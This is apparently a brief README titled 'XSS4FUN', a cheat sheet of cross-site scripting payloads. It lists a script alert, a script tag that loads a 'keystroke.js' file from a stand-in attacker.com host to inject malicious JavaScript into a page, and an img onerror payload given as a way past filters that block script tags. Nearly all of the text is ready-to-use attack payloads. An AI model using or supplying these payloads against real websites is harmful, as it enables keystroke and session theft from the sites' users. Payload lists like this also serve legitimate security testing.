# XSS4FUN :cookie:
Cross-Site-Scripting just for fun.

## Basic payloads:
  - <script>alert(1)</script>

## Useful payloads:
  - **<script src=https://attacker.com/keystroke.js > </script>**
    - To include malicious javascript code in page.
  - **\<img src=anything onerror=alert(1) >**
    - When the **<script>** is being filtered by the Web Application, you can use javascript events.
 
